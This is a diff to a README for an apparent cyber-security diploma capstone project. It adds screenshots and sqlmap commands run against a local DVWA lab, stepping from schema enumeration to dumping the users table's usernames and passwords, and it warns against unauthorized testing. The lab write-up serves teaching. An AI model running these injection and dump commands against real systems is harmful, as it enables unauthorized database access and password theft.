@@ -254,7 +254,35 @@ sqlmap -u "..." --cookie="..." --dbs --batch --output-dir=output/
 
 Only use sqlmap on applications you own or have explicit permission to test. Unauthorized scanning is illegal and unethical.
 
-# ScreenShorts
-https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/froxy%20proxy.png?raw=true
+## ScreenShorts
+# FoxyProxy extension from the Firefox add-ons store.
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/froxy%20proxy.png?raw=true">
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap.png?raw=true">
+# Cookie harvesting.
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/DVWA.png?raw=true">
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/Burbsuite.png?raw=true">
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/DVWA-2.png?raw=true">
+# Scanning for vulnerabilities.
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap-1.png?raw=true">
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap-2.png?raw=true">
+# Revealing the database schemas.
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=9tp5mn3hpkfgh6fddmbampps7m" --schema --batch   
+
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap-3.png?raw=true">
+# Revealing the dvwa tables.
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=9tp5mn3hpkfgh6fddmbampps7m" -D dvwa --tables  
+
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/sqlmap-4.png?raw=true">
+# Enumerate the “users” table.
+qlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=9tp5mn3hpkfgh6fddmbampps7m" --columns -T users --batch  
+
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/enumeraion%20table.png?raw=true">
+# Dump Usernames and Passwords.
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=9tp5mn3hpkfgh6fddmbampps7m" --dump -T users --batch
+
+<img width="299" alt="Register Page" src="https://github.com/4mubarak/Final-Report-for-Professional-Diploma-in-Cyber-Security-Capstone-Project/blob/main/Dumps%20user%20name%20and%20Password.png?raw=true">
+
+
+
 
 
